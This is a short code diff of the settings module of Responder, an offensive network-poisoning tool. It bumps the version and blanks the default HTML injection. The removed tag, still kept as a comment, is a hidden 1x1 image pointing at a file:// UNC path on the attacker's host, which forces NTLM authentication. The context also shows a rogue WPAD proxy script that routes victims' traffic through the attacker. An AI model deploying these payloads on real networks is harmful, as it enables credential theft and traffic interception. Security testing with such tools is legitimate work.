@@ -23,7 +23,7 @@ import subprocess
 
 from utils import *
 
-__version__ = 'Responder 3.1.3.0'
+__version__ = 'Responder 3.1.4.0'
 
 class Settings:
 	
@@ -236,7 +236,7 @@ class Settings:
 		self.HtmlToInject     = config.get('HTTP Server', 'HtmlToInject')
 
 		if len(self.HtmlToInject) == 0:
-			self.HtmlToInject = "<img src='file://///"+self.Bind_To+"/pictures/logo.jpg' alt='Loading' height='1' width='1'>"
+			self.HtmlToInject = ""# Let users set it up themself in Responder.conf. "<img src='file://///"+self.Bind_To+"/pictures/logo.jpg' alt='Loading' height='1' width='1'>"
 
 		if len(self.WPAD_Script) == 0:
 			self.WPAD_Script = 'function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; return "PROXY '+self.Bind_To+':3128; PROXY '+self.Bind_To+':3141; DIRECT";}'
